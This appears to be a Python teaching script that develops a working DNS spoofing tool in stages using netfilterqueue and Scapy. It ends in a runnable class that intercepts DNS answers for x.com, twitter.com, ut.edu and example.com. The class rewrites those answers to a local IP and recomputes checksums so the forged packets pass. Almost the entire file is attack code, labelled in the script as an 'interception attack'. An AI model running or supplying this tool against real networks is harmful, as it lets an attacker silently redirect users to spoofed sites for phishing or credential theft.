#Step 1 - Create queue tables to intercept packets before transmission

# import netfilterqueue
#
# def interceptedpacket(packet):
#         print(packet)
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 2 - Convert intercepted data into a format acceptable for Scapy

# import netfilterqueue
# import scapy.all as scapy
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         packet.accept()
#          print(scapypacket)
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 2.5 - Create a Simple Firewall to block x.com

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import http
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         if scapypacket.haslayer(http.HTTPRequest):
#                 website = scapypacket[http.HTTPRequest].Host.decode()
#                 # print(website)
#                 if "x.com" in website:
#                         packet.drop()
#                         print(f"The user attempted to visit {website}")
#                 else:
#                         print(website)
#                         packet.accept()
#         else:
#                 packet.accept()
#
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 3 - Filter DNS Frame

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import http
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         if scapypacket.haslayer(scapy.DNS):
#                 dnsframe = scapypacket[scapy.DNS]
#                 print(dnsframe.show())
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 4 - Filter DNS Resource Record Only

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         if scapypacket.haslayer(scapy.DNS):
#                 dnsframe = scapypacket[scapy.DNS]
#                 dnsresponse = scapypacket[scapy.DNSRR]
#                 print(dnsframe.show())
#                 print(dnsresponse.show())
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 5 - Prepare the trigger condition - determine websites

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         targetwebsites = ['x.com','twitter.com','ut.edu','example.com']
#         if scapypacket.haslayer(scapy.DNSRR):
#                 # dnsresponse = scapypacket[scapy.DNSRR]
#                 visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
#                 for specificwebsite in targetwebsites:
#                         if specificwebsite in visitedwebsite:
#                             packet.drop()
#                             print(f"The user tried to visit a banned website : {visitedwebsite}")
#                 else:
#                         print(visitedwebsite)
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 6 - Prepare the payload

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         targetwebsites = ['x.com','twitter.com','ut.edu','example.com']
#         if scapypacket.haslayer(scapy.DNSRR):
#                 visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
#                 for specificwebsite in targetwebsites:
#                         if specificwebsite in visitedwebsite:
#                             spoofedresponse = scapy.DNSRR(rrname = visitedwebsite, rdata = '192.168.68.132')
#                             print(spoofedresponse.show())
#                             # print(f"The user tried to visit a banned website : {visitedwebsite}")
#                 else:
#                         pass
#                         # print(visitedwebsite)
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 7 - Attach the DNSRR PAyload to the DNS packet

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         targetwebsites = ['x.com','twitter.com','ut.edu','example.com']
#         if scapypacket.haslayer(scapy.DNSRR):
#                 visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
#                 for specificwebsite in targetwebsites:
#                         if specificwebsite in visitedwebsite:
#                             spoofedresponse = scapy.DNSRR(rrname = visitedwebsite, rdata = '192.168.68.132')
#                             scapypacket[scapy.DNS].an = spoofedresponse
#                             scapypacket[scapy.DNS].ancount = 1
#                             print(scapypacket[scapy.DNS].show())
#                 else:
#                         pass
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 8 - Set and deliver the payload

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         targetwebsites = ['x.com','twitter.com','ut.edu','example.com']
#         if scapypacket.haslayer(scapy.DNSRR):
#                 visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
#                 for specificwebsite in targetwebsites:
#                         if specificwebsite in visitedwebsite:
#                             spoofedresponse = scapy.DNSRR(rrname=visitedwebsite, rdata='192.168.68.132')
#                             scapypacket[scapy.DNS].an = spoofedresponse
#                             scapypacket[scapy.DNS].ancount = 1
#                             print(scapypacket.show())
#                             packet.set_payload(bytes(scapypacket))
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 8.5 - Delete Checksum and length to fool hashing

# import netfilterqueue
# import scapy.all as scapy
# from scapy.layers import dns
#
# def interceptedpacket(packet):
#         scapypacket = scapy.IP(packet.get_payload())
#         targetwebsites = ['x.com','twitter.com','ut.edu','example.com']
#         if scapypacket.haslayer(scapy.DNSRR):
#                 visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
#                 for specificwebsite in targetwebsites:
#                         if specificwebsite in visitedwebsite:
#                             spoofedresponse = scapy.DNSRR(rrname=visitedwebsite, rdata='192.168.68.132')
#                             scapypacket[scapy.DNS].an = spoofedresponse
#                             scapypacket[scapy.DNS].ancount = 1
#                             del scapypacket[scapy.IP].len
#                             del scapypacket[scapy.IP].chksum
#                             del scapypacket[scapy.UDP].len
#                             del scapypacket[scapy.UDP].chksum
#                             print(scapypacket.show())
#                             packet.set_payload(bytes(scapypacket))
#
#         packet.accept()
#
# queuetable = netfilterqueue.NetfilterQueue()
# queuetable.bind(601,interceptedpacket)
# queuetable.run()

#Step 9 - Separate functions

import netfilterqueue
import scapy.all as scapy
from scapy.layers import dns

class DNS_spoofer_Stanek:

    def __init__(self,queuenumber):
        self.queuenumber = queuenumber

    def deletehashing(self,scapypacket):
        del scapypacket[scapy.IP].len
        del scapypacket[scapy.IP].chksum
        del scapypacket[scapy.UDP].len
        del scapypacket[scapy.UDP].chksum

    def dnsspoofing(self,packet):
        scapypacket = scapy.IP(packet.get_payload())
        targetwebsites = ['x.com', 'twitter.com', 'ut.edu', 'example.com']
        if scapypacket.haslayer(scapy.DNSRR):
            visitedwebsite = scapypacket[scapy.DNSRR].rrname.decode()
            for specificwebsite in targetwebsites:
                if specificwebsite in visitedwebsite:
                    spoofedresponse = scapy.DNSRR(rrname=visitedwebsite, rdata='192.168.68.132')
                    scapypacket[scapy.DNS].an = spoofedresponse
                    scapypacket[scapy.DNS].ancount = 1
                    self.deletehashing(scapypacket)
                    print(f"The user has been redirected from {visitedwebsite} to our spoofed site.")
                    packet.set_payload(bytes(scapypacket))

    def interceptedpacket(self,packet):
        try:
            self.dnsspoofing(packet)
            packet.accept()
        except Exception as errormessage:
            print(errormessage)
            packet.accept()

    def startinterception(self,queuenum):
        queuetable = netfilterqueue.NetfilterQueue()
        queuetable.bind(queuenum,self.interceptedpacket)
        queuetable.run()

    def initiateattack(self):
        try:
            print("Starting interception attack.")
            self.startinterception(self.queuenumber)
        except KeyboardInterrupt:
            print("\nInterception attack stopped.")

if __name__ == '__main__':
    start = DNS_spoofer_Stanek(601).initiateattack()